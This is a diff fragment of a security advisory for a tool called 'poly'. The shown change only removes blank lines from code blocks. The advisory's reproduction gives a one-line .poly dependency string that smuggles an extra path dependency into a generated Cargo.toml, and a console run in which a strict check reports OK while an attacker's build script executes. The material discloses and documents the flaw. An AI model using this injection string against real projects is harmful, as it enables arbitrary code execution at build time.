@@ -53,45 +53,10 @@ TOML string and `\n` to start a new line.
 **Reproduction (confirmed end-to-end).** A one-line `.poly` file:
 
 ~~~poly fragment
-
-
-
-
-
-
-
 dep serde = "1.0\"\nevilbuild = { path = \"/tmp/polysec/evilbuild\" }\n#"
-
-
-
-
-
-
-
 fn main()
-
-
-
-
-
-
-
     put "hi"
-
-
-
-
-
-
-
 end fn
-
-
-
-
-
-
-
 ~~~
 
 with `/tmp/polysec/evilbuild/Cargo.toml` declaring `name = "evilbuild"` and a
@@ -107,45 +72,10 @@ evilbuild = { path = "/tmp/polysec/evilbuild" }
 The remainder of the file is a TOML comment, so the manifest is valid. Then:
 
 ~~~console
-
-
-
-
-
-
-
 $ poly --check --strict rce.poly
-
-
-
-
-
-
-
 OK: 2 statements parsed, rust code compiles
-
-
-
-
-
-
-
 $ cat /tmp/polysec/PWNED_BUILD_SCRIPT
-
-
-
-
-
-
-
 arbitrary code executed at build time
-
-
-
-
-
-
-
 ~~~
 
 Note the output: **`--check --strict` reported OK while executing the attacker's
